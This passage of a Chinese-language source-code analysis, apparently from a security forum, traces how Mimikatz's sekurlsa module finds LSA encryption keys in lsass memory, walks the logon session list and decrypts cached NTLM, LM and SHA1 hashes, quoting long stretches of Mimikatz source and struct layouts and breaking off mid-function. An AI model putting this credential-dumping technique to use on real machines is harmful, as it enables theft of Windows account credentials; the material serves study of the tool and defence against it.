这里以获取 `h3DesKey` 为例，获取 `hAesKey` 的方法相同。首先通过 `kull_m_memory_copy()` 函数获取保存 `h3DesKey` 偏移量的那四个字节的值，并加到 `rip` 指令的地址上得到了 `h3DesKey` 变量的地址，然后再将 `h3DesKey` 变量复制到 `hKey` 指向的内存中。这里需要知道的 `h3DesKey` 变量是一个 `BCRYPT_KEY_HANDLE` 的句柄结构，由于句柄相当于指针的指针，因此该句柄中保存着存储密钥内容的那块内存的指针的指针，指向密钥的指针结构，可以在 Mimikatz 中找到了这个结构：

```c++
typedef struct _KIWI_BCRYPT_HANDLE_KEY {
    ULONG size;
    ULONG tag;  // 'UUUR'
    PVOID hAlgorithm;
    PKIWI_BCRYPT_KEY key;
    PVOID unk0;
} KIWI_BCRYPT_HANDLE_KEY, *PKIWI_BCRYPT_HANDLE_KEY;
```

其中 `tag` 是该结构中不变的标签，这在 WinDBG 中可以看到，如下图所示。可以通过检查 `tag` 是否等于 ”UUUR“ 来确认当前找到的是该结构。

![image-20221218125311390](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-9a2e2cde7a0407ebf1aa6b2006abaa325d51c395.png)

此外还可以看到 `KIWI_BCRYPT_HANDLE_KEY` 中的属性 `key` 是一个指向 `KIWI_BCRYPT_KEY` 结构体的指针，由于当前测试环境为 Windows 10 x64 1903，因此这使用的是 `KIWI_BCRYPT_KEY81` 版本，其声明如下。

```c++
typedef struct _KIWI_BCRYPT_KEY81 {
    ULONG size;
    ULONG tag;  // 'MSSK'
    ULONG type;
    ULONG unk0;
    ULONG unk1;
    ULONG unk2;
    ULONG unk3;
    ULONG unk4;
    PVOID unk5; // before, align in x64
    ULONG unk6;
    ULONG unk7;
    ULONG unk8;
    ULONG unk9;
    KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY81, *PKIWI_BCRYPT_KEY81;
```

其中 `tag` 是该结构中不变的标签，在上图所示中可以看到，在 `KIWI_BCRYPT_HANDLE_KEY` 结构后面引用了 `KIWI_BCRYPT_KEY81`。

此外 `KIWI_BCRYPT_KEY81` 的最后一个成员 `hardkey` 是一个 `KIWI_HARD_KEY` 结构体，该结构声明如下，其中的字节数组 `data` 保存了实际的密钥值，而 `cbSecret` 是 `data` 的大小。

```c++
typedef struct _KIWI_HARD_KEY {
    ULONG cbSecret;
    BYTE data[ANYSIZE_ARRAY]; // etc...
} KIWI_HARD_KEY, *PKIWI_HARD_KEY;
```

我们可以使用 WinDBG 来提取这个密钥，如下所示：

![image-20221218125411580](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-a0fdf7a5de0a529e81e576b29ed06eafdec0fe7b.png)

这样我们就得到了`h3DesKey`，大小为`0x18`字节，包含如下数据：

```c++
dd 03 51 00 bc 78 57 2c 61 7d 74 ba 72 c2 d0 32 fe 01 e4 bc 34 39 be
```

我们可以通过相同的过程来提取 `hAesKey` 中的密钥：

![image-20221218125505598](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-4f1fd2353dc1151c6d94e98f3da2a3d6118234d3.png)

最后再调用 `BCryptGenerateSymmetricKey()` 函数，通过已获取的密钥内容创建一个密钥对象，并由 `pGenKey-&gt;hKey` 接收得到的密钥句柄，用于后续的解密过程。

至此，整个 `kuhl_m_sekurlsa_acquireLSA()` 函数调用结束，返回 `kuhl_m_sekurlsa_enum()` 函数中枚举用户信息。

Enumerate Session Information
=============================

Pivoting From LogonSessionList
------------------------------

在前文中曾经提到过，`LogonSessionList` 是一个 `LIST_ENTRY` 结构体，因此它也是一个双向链表，可以使用 WinDBG 命令遍历浏览，如下图所示。

![image-20221218125559775](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-4a0947e23e4b054f27efdfb25b6798e5a5857aaf.png)

该结构中的 `Flink` 指向真正的模块链表，链表的每个成员都是一个包含了用户会话信息的结构体，具体结构因不同系统而异，在 Windows 10 x64 1903 系统中，Mimikatz 对其声明如下。

```c++
typedef struct _KIWI_MSV1_0_LIST_63 {
    struct _KIWI_MSV1_0_LIST_63 *Flink; //off_2C5718
    struct _KIWI_MSV1_0_LIST_63 *Blink; //off_277380
    PVOID unk0; // unk_2C0AC8
    ULONG unk1; // 0FFFFFFFFh
    PVOID unk2; // 0
    ULONG unk3; // 0
    ULONG unk4; // 0
    ULONG unk5; // 0A0007D0h
    HANDLE hSemaphore6; // 0F9Ch
    PVOID unk7; // 0
    HANDLE hSemaphore8; // 0FB8h
    PVOID unk9; // 0
    PVOID unk10; // 0
    ULONG unk11; // 0
    ULONG unk12; // 0 
    PVOID unk13; // unk_2C0A28
    LUID LocallyUniqueIdentifier;
    LUID SecondaryLocallyUniqueIdentifier;
    BYTE waza[12]; /// to do (maybe align)
    LSA_UNICODE_STRING UserName;
    LSA_UNICODE_STRING Domaine;
    PVOID unk14;
    PVOID unk15;
    LSA_UNICODE_STRING Type;
    PSID  pSid;
    ULONG LogonType;
    PVOID unk18;
    ULONG Session;
    LARGE_INTEGER LogonTime; // autoalign x86
    LSA_UNICODE_STRING LogonServer;
    PKIWI_MSV1_0_CREDENTIALS Credentials;
    PVOID unk19;
    PVOID unk20;
    PVOID unk21;
    ULONG unk22;
    ULONG unk23;
    ULONG unk24;
    ULONG unk25;
    ULONG unk26;
    PVOID unk27;
    PVOID unk28;
    PVOID unk29;
    PVOID CredentialManager;
} KIWI_MSV1_0_LIST_63, *PKIWI_MSV1_0_LIST_63;
```

可以看到，该结构里包含了用户名（UserName）、域名（Domaine）、登录时间（LogonTime）、凭据（Credentials）以及登录到的服务器（LogonServer）等信息，其中 UserName 在结构中偏移量为 `0x90`，我们可以通过 WinDBG 遍历出所有的用户名，如下图所示。

![image-20221218125821684](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-823deed864f2c150151886bb311459f53fd4e0f3.png)

同理在偏移量为 `0xF8` 处获取登录到的服务器名，如下图所示。

![image-20221218130142586](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-598e9db090b2d287477ff1258b2a90961f6c9b75.png)

Enumerate User Information
--------------------------

回到 `kuhl_m_sekurlsa_enum()` 函数中，定义了以下部分代码用于枚举用户信息。

```c++
if(NT_SUCCESS(status))
{
    sessionData.cLsass = &amp;cLsass;
    sessionData.lsassLocalHelper = lsassLocalHelper;

    if(cLsass.osContext.BuildNumber &lt; KULL_M_WIN_MIN_BUILD_2K3)
        helper = &amp;lsassEnumHelpers[0];
    else if(cLsass.osContext.BuildNumber &lt; KULL_M_WIN_MIN_BUILD_VISTA)
        helper = &amp;lsassEnumHelpers[1];
    else if(cLsass.osContext.BuildNumber &lt; KULL_M_WIN_MIN_BUILD_7)
        helper = &amp;lsassEnumHelpers[2];
    else if(cLsass.osContext.BuildNumber &lt; KULL_M_WIN_MIN_BUILD_8)
        helper = &amp;lsassEnumHelpers[3];
    else if(cLsass.osContext.BuildNumber &lt; KULL_M_WIN_MIN_BUILD_BLUE)
        helper = &amp;lsassEnumHelpers[5];
    else
        helper = &amp;lsassEnumHelpers[6];
    if((cLsass.osContext.BuildNumber &gt;= KULL_M_WIN_MIN_BUILD_7) &amp;&amp; (cLsass.osContext.BuildNumber &lt; KULL_M_WIN_MIN_BUILD_BLUE) &amp;&amp; (kuhl_m_sekurlsa_msv_package.Module.Informations.TimeDateStamp &gt; 0x53480000))
        helper++; // yeah, really, I do that =)

    securityStruct.hMemory = cLsass.hLsassMem;
    if(securityStruct.address = LogonSessionListCount)
        // 把 LogonSessionListCount 复制到 nbListes 中
        kull_m_memory_copy(&amp;data, &amp;securityStruct, sizeof(ULONG));

    // for(i = 0; i &lt; LogonSessionListCount; i++)
    for(i = 0; i &lt; nbListes; i++)
    {
        securityStruct.address = &amp;LogonSessionList[i];
        data.address = &amp;pStruct;
        data.hMemory = &amp;KULL_M_MEMORY_GLOBAL_OWN_HANDLE;
        if(aBuffer.address = LocalAlloc(LPTR, helper-&gt;tailleStruct))
        {
            // 把 LogonSessionList[i] 复制到 pStruct 指向的内存中
            if(kull_m_memory_copy(&amp;data, &amp;securityStruct, sizeof(PVOID)))
            {
                data.address = pStruct;
                data.hMemory = securityStruct.hMemory;

                // while((pStruct != &amp;LogonSessionList[i]) &amp;&amp; retCallback)
                while((data.address != securityStruct.address) &amp;&amp; retCallback)
                {
                    // 把 LogonSessionList[i]（pStruct）复制到 aBuffer.address 指向的内存中
                    if(kull_m_memory_copy(&amp;aBuffer, &amp;data, helper-&gt;tailleStruct))
                    {
                        sessionData.LogonId     = (PLUID)           ((PBYTE) aBuffer.address + helper-&gt;offsetToLuid);
                        sessionData.LogonType   = *((PULONG)        ((PBYTE) aBuffer.address + helper-&gt;offsetToLogonType));
                        sessionData.Session     = *((PULONG)        ((PBYTE) aBuffer.address + helper-&gt;offsetToSession));
                        sessionData.UserName    = (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;offsetToUsername);
                        sessionData.LogonDomain = (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;offsetToDomain);
                        sessionData.pCredentials= *(PVOID *)        ((PBYTE) aBuffer.address + helper-&gt;offsetToCredentials);
                        sessionData.pSid        = *(PSID *)         ((PBYTE) aBuffer.address + helper-&gt;offsetToPSid);
                        sessionData.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper-&gt;offsetToCredentialManager);
                        sessionData.LogonTime   = *((PFILETIME)     ((PBYTE) aBuffer.address + helper-&gt;offsetToLogonTime));
                        sessionData.LogonServer = (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;offsetToLogonServer);

                        kull_m_process_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
                        kull_m_process_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
                        kull_m_process_getUnicodeString(sessionData.LogonServer, cLsass.hLsassMem);
                        kull_m_process_getSid(&amp;sessionData.pSid, cLsass.hLsassMem);
                        // callback 为 kuhl_m_sekurlsa_enum_callback_logondata
                        retCallback = callback(&amp;sessionData, pOptionalData);

                        if(sessionData.UserName-&gt;Buffer)
                            LocalFree(sessionData.UserName-&gt;Buffer);
                        if(sessionData.LogonDomain-&gt;Buffer)
                            LocalFree(sessionData.LogonDomain-&gt;Buffer);
                        if(sessionData.LogonServer-&gt;Buffer)
                            LocalFree(sessionData.LogonServer-&gt;Buffer);
                        if(sessionData.pSid)
                            LocalFree(sessionData.pSid);

                        data.address = ((PLIST_ENTRY) (aBuffer.address))-&gt;Flink;
                    }
                    else break;
                }
            }
            LocalFree(aBuffer.address);
        }
    }
}
```

这里先根据 `BuildNumber` 中的系统版本，从 `lsassEnumHelpers` 中选择适合的条目，这是一个 `KUHL_M_SEKURLSA_ENUM_HELPER` 结构体的数组，用于保存用户的各种信息在 `KIWI_MSV1_0_LIST_63` 中的偏移量，其声明如下。

```c++
typedef struct _KUHL_M_SEKURLSA_ENUM_HELPER {
    SIZE_T tailleStruct;
    ULONG offsetToLuid;
    ULONG offsetToLogonType;
    ULONG offsetToSession;
    ULONG offsetToUsername;
    ULONG offsetToDomain;
    ULONG offsetToCredentials;
    ULONG offsetToPSid;
    ULONG offsetToCredentialManager;
    ULONG offsetToLogonTime;
    ULONG offsetToLogonServer;
} KUHL_M_SEKURLSA_ENUM_HELPER, *PKUHL_M_SEKURLSA_ENUM_HELPER;
```

在 Windows 10 x64 1903 系统中，Mimikatz 使用的条目如下：

```c++
{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonServer)}
```

然后通过遍历 `LogonSessionList` 依次得到用户名、域名、凭据、SID、登录时间以及登录到的服务器等信息，并将让它们临时保存在 `sessionData` 中，这是一个 `KIWI_BASIC_SECURITY_LOGON_SESSION_DATA` 结构体，其声明如下。

```c++
typedef struct _KIWI_BASIC_SECURITY_LOGON_SESSION_DATA {
    PKUHL_M_SEKURLSA_CONTEXT    cLsass;
    const KUHL_M_SEKURLSA_LOCAL_HELPER * lsassLocalHelper;
    PLUID                       LogonId;
    PLSA_UNICODE_STRING         UserName;
    PLSA_UNICODE_STRING         LogonDomain;
    ULONG                       LogonType;
    ULONG                       Session;
    PVOID                       pCredentials;
    PSID                        pSid;
    PVOID                       pCredentialManager;
    FILETIME                    LogonTime;
    PLSA_UNICODE_STRING         LogonServer;
} KIWI_BASIC_SECURITY_LOGON_SESSION_DATA, *PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA;
```

最后将 `&amp;sessionData` 和 `pOptionalData` 传入回调函数 `kuhl_m_sekurlsa_enum_callback_logondata()`。

Print logon Information
=======================

Print Basic User Information
----------------------------

跟进 `kuhl_m_sekurlsa_enum_callback_logondata()` 函数：

- sekurlsa\\kuhl\_m\_sekurlsa.c

```c++
BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
    PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA pLsassData = (PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA) pOptionalData;
    ULONG i;
    //PDWORD sub = NULL;
    if((pData-&gt;LogonType != Network))
    {
        kuhl_m_sekurlsa_printinfos_logonData(pData);
        // 遍历 pLsassData 中的所有 lsass 包，这里只有一个 kuhl_m_sekurlsa_msv_package
        for(i = 0; i &lt; pLsassData-&gt;nbPackages; i++)
        {
            if(pLsassData-&gt;lsassPackages[i]-&gt;Module.isPresent &amp;&amp; lsassPackages[i]-&gt;isValid)
            {
                kprintf(L"\t%s :\t", pLsassData-&gt;lsassPackages[i]-&gt;Name);
                // CredsForLUIDFunc 为 kuhl_m_sekurlsa_enum_logon_callback_msv
                pLsassData-&gt;lsassPackages[i]-&gt;CredsForLUIDFunc(pData);
                kprintf(L"\n");
            }
        }
    }
    return TRUE;
}
```

在该函数中，先判断登录类型是否是 Network，如果不是，则对传入的用户登录信息 `pData` 调用 `kuhl_m_sekurlsa_printinfos_logonData()` 函数。

跟进 `kuhl_m_sekurlsa_printinfos_logonData()` 函数：

- sekurlsa\\kuhl\_m\_sekurlsa.c

```c++
void kuhl_m_sekurlsa_printinfos_logonData(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
    kprintf(L"\nAuthentication Id : %u ; %u (%08x:%08x)\n"
        L"Session           : %s from %u\n"
        L"User Name         : %wZ\n"
        L"Domain            : %wZ\n"
        L"Logon Server      : %wZ\n"
        , pData-&gt;LogonId-&gt;HighPart, pData-&gt;LogonId-&gt;LowPart, pData-&gt;LogonId-&gt;HighPart, pData-&gt;LogonId-&gt;LowPart, KUHL_M_SEKURLSA_LOGON_TYPE[pData-&gt;LogonType], pData-&gt;Session, pData-&gt;UserName, pData-&gt;LogonDomain, pData-&gt;LogonServer);

    kprintf(L"Logon Time        : ");
    kull_m_string_displayLocalFileTime(&amp;pData-&gt;LogonTime);
    kprintf(L"\n");

    kprintf(L"SID               : ");
    if(pData-&gt;pSid)
        kull_m_string_displaySID(pData-&gt;pSid);
    kprintf(L"\n");
}
```

在该函数中打印用户的会话、用户名、域名、登录到的服务器、登陆时间以及 SID 登信息。

回到 `kuhl_m_sekurlsa_enum_callback_logondata()` 函数中，继续对 `pData` 调用 lsass 包中的 `CredsForLUIDFunc` 指向的函数，在这里是 `kuhl_m_sekurlsa_enum_logon_callback_msv()` 函数。

Print Credentials Information
-----------------------------

跟进 `kuhl_m_sekurlsa_enum_logon_callback_msv()` 函数：

- sekurlsa\\packages\\kuhl\_m\_sekurlsa\_msv1\_0.c

```c++
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
    kuhl_m_sekurlsa_msv_enum_cred(pData-&gt;cLsass, pData-&gt;pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_std, pData);
}
```

直接调用了 `kuhl_m_sekurlsa_msv_enum_cred()` 函数，并将 `pData-&gt;pCredentials` 传入该函数中进行凭据处理。

### Handle Credentials Structure

跟进 `kuhl_m_sekurlsa_msv_enum_cred()` 函数：

- sekurlsa\\packages\\kuhl\_m\_sekurlsa\_msv1\_0.c

```c++
VOID kuhl_m_sekurlsa_msv_enum_cred(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PVOID pCredentials, IN PKUHL_M_SEKURLSA_MSV_CRED_CALLBACK credCallback, IN PVOID optionalData)
{
    KIWI_MSV1_0_CREDENTIALS credentials;
    KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
    KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &amp;KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {pCredentials, cLsass-&gt;hLsassMem};

    while(aLsassMemory.address)
    {
        aLocalMemory.address = &amp;credentials;
        // 把 pData-&gt;pCredentials 复制到 credentials 指向的内存中
        if(kull_m_memory_copy(&amp;aLocalMemory, &amp;aLsassMemory, sizeof(KIWI_MSV1_0_CREDENTIALS)))
        {
            aLsassMemory.address = credentials.PrimaryCredentials;
            while(aLsassMemory.address)
            {
                aLocalMemory.address = &amp;primaryCredentials;
                // 把 pCredentials.PrimaryCredentials 复制到 primaryCredentials 指向的内存中
                if(kull_m_memory_copy(&amp;aLocalMemory, &amp;aLsassMemory, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)))
                {
                    // primaryCredentials.Credentials.Buffer 指向搜寻目标缓存凭据的地址
                    aLsassMemory.address = primaryCredentials.Credentials.Buffer;
                    if(kull_m_process_getUnicodeString(&amp;primaryCredentials.Credentials, cLsass-&gt;hLsassMem))
                    {
                        if(kull_m_process_getUnicodeString((PUNICODE_STRING) &amp;primaryCredentials.Primary, cLsass-&gt;hLsassMem))
                        {
                            // credCallback 为 kuhl_m_sekurlsa_msv_enum_cred_callback_std
                            credCallback(cLsass, &amp;primaryCredentials, credentials.AuthenticationPackageId, &amp;aLsassMemory, optionalData);
                            LocalFree(primaryCredentials.Primary.Buffer);
                        }
                        LocalFree(primaryCredentials.Credentials.Buffer);
                    }
                } else kprintf(L"n.e. (KIWI_MSV1_0_PRIMARY_CREDENTIALS KO)");
                aLsassMemory.address = primaryCredentials.next;
            }
            aLsassMemory.address = credentials.next;
        } else kprintf(L"n.e. (KIWI_MSV1_0_CREDENTIALS KO)");
    }
}
```

回顾前文，我们在枚举 `KIWI_MSV1_0_LIST_63` 结构体时可以看到，凭据属性 `Credentials` 在该结构中的偏移量为 `0x108`，这是一个 `PKIWI_MSV1_0_CREDENTIALS` 结构体，其声明如下。

```c++
typedef struct _KIWI_MSV1_0_CREDENTIALS {
    struct _KIWI_MSV1_0_CREDENTIALS *next;
    DWORD AuthenticationPackageId;
    PKIWI_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials;
} KIWI_MSV1_0_CREDENTIALS, *PKIWI_MSV1_0_CREDENTIALS;
```

`KIWI_MSV1_0_CREDENTIALS` 的 `0x10` 偏移量处的 `PrimaryCredentials` 是一个指向 `KIWI_MSV1_0_PRIMARY_CREDENTIALS` 结构体的指针，其声明如下。

```c++
typedef struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS {
    struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS *next;
    ANSI_STRING Primary;    // 'Primary'
    LSA_UNICODE_STRING Credentials;
} KIWI_MSV1_0_PRIMARY_CREDENTIALS, *PKIWI_MSV1_0_PRIMARY_CREDENTIALS;
```

其中 `Primary` 的值是一个签名字符串 ”Primary“，类似于 `KIWI_BCRYPT_HANDLE_KEY` 中的 `tag`，这可以在内存中看到，如下图所示。而 `Credentials` 中就保存了加密的用户哈希凭据，该结构中的 `Buffer` 指向缓存凭据的内存地址。

![image-20221218130304106](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-b5dfdfdddb45a556a5d5c2394cbbe7931a033697.png)

回到 `kuhl_m_sekurlsa_msv_enum_cred()` 函数中，经过几次 `kull_m_memory_copy()` 调用后，将 `&amp;primaryCredentials` 和 `credentials.AuthenticationPackageId` 传入回调函数，在这里是 `kuhl_m_sekurlsa_msv_enum_cred_callback_std()` 函数，该函数定义如下。

```c++
BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_std(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PKIWI_MSV1_0_PRIMARY_CREDENTIALS pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData)
{
    DWORD flags = KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL;
    kprintf(L"\n\t [%08x] %Z", AuthenticationPackageId, &amp;pCredentials-&gt;Primary);
    if(RtlEqualString(&amp;pCredentials-&gt;Primary, &amp;PRIMARY_STRING, FALSE))    // 进入
        flags |= KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY;
    else if(RtlEqualString(&amp;pCredentials-&gt;Primary, &amp;CREDENTIALKEYS_STRING, FALSE))
        flags |= KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY;
    kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &amp;pCredentials-&gt;Credentials, (PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA) pOptionalData, flags);
    return TRUE;
}
```

首先根据 `PrimaryCredentials` 结构中的 `Primary` 类型设置 `flags` 值，接着将 `PrimaryCredentials` 中的 `Credentials` 传入 `kuhl_m_sekurlsa_genericCredsOutput()` 函数。

`Credentials` 中 `Buffer` 指向缓存凭据的加密内存，该内存解密后的结构因系统版本而异，在 Windows 10 x64 1903 系统中的结构如下。

```c++
typedef struct _MSV1_0_PRIMARY_CREDENTIAL_10_1607 {
    LSA_UNICODE_STRING LogonDomainName; 
    LSA_UNICODE_STRING UserName;
    PVOID pNtlmCredIsoInProc;
    BOOLEAN isIso;
    BOOLEAN isNtOwfPassword;
    BOOLEAN isLmOwfPassword;
    BOOLEAN isShaOwPassword;
    BOOLEAN isDPAPIProtected;
    BYTE align0;
    BYTE align1;
    BYTE align2;
    DWORD unkD; // 1/2
    #pragma pack(push, 2)
    WORD isoSize;  // 0000
    BYTE DPAPIProtected[LM_NTLM_HASH_LENGTH];
    DWORD align3; // 00000000
    #pragma pack(pop) 
    BYTE NtOwfPassword[LM_NTLM_HASH_LENGTH];
    BYTE LmOwfPassword[LM_NTLM_HASH_LENGTH];
    BYTE ShaOwPassword[SHA_DIGEST_LENGTH];
    /* buffer */
} MSV1_0_PRIMARY_CREDENTIAL_10_1607, *PMSV1_0_PRIMARY_CREDENTIAL_10_1607;
```

其中 `NtOwfPassword`、`LmOwfPassword` 和 `ShaOwPassword` 这三个关键的字节序列分别存储了用户的 NT Hash、LM Hash 和 SHA1 散列值，三者在该结构中的偏移量分别是 `0x4A`、`0x5A` 和 `0x6A`。`kuhl_m_sekurlsa_genericCredsOutput()` 函数的作用就是根据三种哈希值在内存中的偏移量来取出它们的值，再以 Hex 格式打印出来，该函数定义如下。

```c++
VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, ULONG flags)
{
    PUNICODE_STRING username = NULL, domain = NULL, password = NULL;
    PKIWI_CREDENTIAL_KEYS pKeys = NULL;
    PKERB_HASHPASSWORD_GENERIC pHashPassword;
    UNICODE_STRING buffer;
    DWORD type, i;
    BOOL isNull = FALSE;
    PWSTR sid = NULL;
    PBYTE msvCredentials;
    const MSV1_0_PRIMARY_HELPER * pMSVHelper;
#if defined(_M_X64) || defined(_M_ARM64)
    // ......
#endif
    SHA_CTX shaCtx;
    SHA_DIGEST shaDigest;

    if(mesCreds)
    {
        // 将 SID 转换为适合显示的字符串格式
        ConvertSidToStringSid(pData-&gt;pSid, &amp;sid);
        if(flags &amp; KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL)
        {
            type = flags &amp; KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL_MASK;
            //  Buffer 是指向缓存凭据的内存地址，这里将包含凭据的加密内存指针赋给 msvCredentials
            if(msvCredentials = (PBYTE) ((PUNICODE_STRING) mesCreds)-&gt;Buffer)
            {
                if(!(flags &amp; KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* &amp;&amp; *lsassLocalHelper-&gt;pLsaUnprotectMemory*/)
                    (*lsassLocalHelper-&gt;pLsaUnprotectMemory)(msvCredentials, ((PUNICODE_STRING) mesCreds)-&gt;Length);

                switch(type)
                {
                    case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY:
                        // 根据系统版本选择适合的内存结构，这里是 MSV1_0_PRIMARY_CREDENTIAL_10_1607
                        pMSVHelper = kuhl_m_sekurlsa_msv_helper(pData-&gt;cLsass);
                        // 获取并打印凭据信息里的用户名和域名
                        kull_m_string_MakeRelativeOrAbsoluteString(msvCredentials, (PUNICODE_STRING) (msvCredentials + pMSVHelper-&gt;offsetToLogonDomain), FALSE);
                        kull_m_string_MakeRelativeOrAbsoluteString(msvCredentials, (PUNICODE_STRING) (msvCredentials + pMSVHelper-&gt;offsetToUserName), FALSE);
                        kprintf(L"\n\t * Username : %wZ\n\t * Domain   : %wZ", (PUNICODE_STRING) (msvCredentials + pMSVHelper-&gt;offsetToUserName), (PUNICODE_STRING) (msvCredentials + pMSVHelper-&gt;offsetToLogonDomain));
                        if(!pMSVHelper-&gt;offsetToisIso || !*(PBOOLEAN) (msvCredentials + pMSVHelper-&gt;offsetToisIso))
                        {
                            // 获取并打印 LM Hash 值
                            if(*(PBOOLEAN) (msvCredentials + pMSVHelper-&gt;offsetToisLmOwfPassword))
                            {
                                kprintf(L"\n\t * LM       : ");
                                kull_m_string_wprintf_hex(msvCredentials + pMSVHelper-&gt;offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
                            }
                            // 获取并打印 NT Hash 值
                            if(*(PBOOLEAN) (msvCredentials + pMSVHelper-&gt;offsetToisNtOwfPassword))
                            {
                                kprintf(L"\n\t * NTLM     : ");
                                kull_m_string_wprintf_hex(msvCredentials + pMSVHelper-&gt;offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
                            }
                            // 获取并打印 SHA1 Hash 值
                            if(*(PBOOLEAN) (msvCredentials + pMSVHelper-&gt;offsetToisShaOwPassword))
                            {
                                kprintf(L"\n\t * SHA1     : ");
                                kull_m_string_wprintf_hex(msvCredentials + pMSVHelper-&gt;offsetToShaOwPassword, SHA_DIGEST_LENGTH, 0);
                            }
                            if(sid &amp;&amp; (*(PBOOLEAN) (msvCredentials + pMSVHelper-&gt;offsetToisNtOwfPassword) || *(PBOOLEAN) (msvCredentials + pMSVHelper-&gt;offsetToisShaOwPassword)))
                                kuhl_m_dpapi_oe_credential_add(sid, NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper-&gt;offsetToisNtOwfPassword) ? msvCredentials + pMSVHelper-&gt;offsetToNtOwfPassword : NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper-&gt;offsetToisShaOwPassword) ? msvCredentials + pMSVHelper-&gt;offsetToShaOwPassword : NULL, NULL, NULL);
                        }
                        #if defined(_M_X64) || defined(_M_ARM64)
                        else
                        {
                            // ......
                        }
                        #endif
                        // ......
                case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
                    // ......
                default:
                    kprintf(L"\n\t * Raw data : ");
                    kull_m_string_wprintf_hex(msvCredentials, ((PUNICODE_STRING) mesCreds)-&gt;Length, 1);
                }
            }
        }

        // ......

        if(flags &amp; KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE)
            kprintf(L"\n");

        if(sid)
            LocalFree(sid);
    }
    else kprintf(L"LUID KO\n");
}
```

### Unprotect Lsa Memory

这里先将包含凭据的加密内存地址赋给 `msvCredentials`，然后对这块内存调用 `lsassLocalHelper-&gt;pLsaUnprotectMemory` 指向的函数，在这里是 `kuhl_m_sekurlsa_nt6_LsaUnprotectMemory()` 函数，该函数定义如下。

```c++
VOID WINAPI kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(IN PVOID Buffer, IN ULONG BufferSize)
{
    kuhl_m_sekurlsa_nt6_LsaEncryptMemory((PUCHAR) Buffer, BufferSize, FALSE);
}
```

跟进 `kuhl_m_sekurlsa_nt6_LsaEncryptMemory()` 函数，如下所示，该函数对 `BCryptEncrypt()` 和 `BCryptDecrypt()` 函数进行封装，二者利用提供的初始化向量和密钥，分别对指定内存的数据块进行加密和解密。

```c++
NTSTATUS kuhl_m_sekurlsa_nt6_LsaEncryptMemory(PUCHAR pMemory, ULONG cbMemory, BOOL Encrypt)
{
    NTSTATUS status = STATUS_NOT_FOUND;
    BCRYPT_KEY_HANDLE *hKey;
    BYTE LocalInitializationVector[16];
    ULONG cbIV, cbResult;
    PBCRYPT_ENCRYPT cryptFunc = Encrypt ? BCryptEncrypt : BCryptDecrypt;
    RtlCopyMemory(LocalInitializationVector, InitializationVector, sizeof(InitializationVector));
    if(cbMemory % 8)
    {
        hKey = &amp;kAes.hKey;
        cbIV = sizeof(InitializationVector);
    }
    else
    {
        hKey = &amp;k3Des.hKey;
